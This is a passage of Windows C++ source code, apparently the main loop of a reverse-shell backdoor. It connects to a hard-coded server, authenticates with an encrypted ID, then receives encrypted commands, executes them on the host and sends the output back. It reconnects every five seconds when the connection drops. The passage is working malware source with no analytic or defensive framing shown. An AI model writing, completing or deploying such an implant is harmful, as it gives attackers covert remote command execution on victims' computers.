        SOCKET sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
        if (sock == INVALID_SOCKET) {
            Sleep(5000);
            continue;
        }

        sockaddr_in server_addr;
        server_addr.sin_family = AF_INET;
        server_addr.sin_port = htons(SERVER_PORT);
        inet_pton(AF_INET, SERVER_IP, &server_addr.sin_addr);

        if (connect(sock, reinterpret_cast<sockaddr*>(&server_addr), sizeof(server_addr)) == SOCKET_ERROR) {
            closesocket(sock);
            Sleep(5000);
            continue;
        }

        auto auth_data_encrypted = cipher.encrypt(AUTH_ID);
        send_data(sock, auth_data_encrypted);

        while (true) {
            try {
                auto encrypted_command = recv_data(sock);
                std::string command = cipher.decrypt(encrypted_command);

                command.erase(std::remove(command.begin(), command.end(), '\r'), command.end());

                if (command.empty()) continue;
                if (command == "exit" || command == "quit") break;

                auto output = execute_command(command);
                std::string output_str(output.begin(), output.end());

                if (output_str == "exit") break;

                auto encrypted_output = cipher.encrypt(output_str);
                send_data(sock, encrypted_output);
            }
            catch (const std::exception& e) {
                break;
            }
        }

        closesocket(sock);
        Sleep(5000);
    }

    WSACleanup();
    return 0;
}
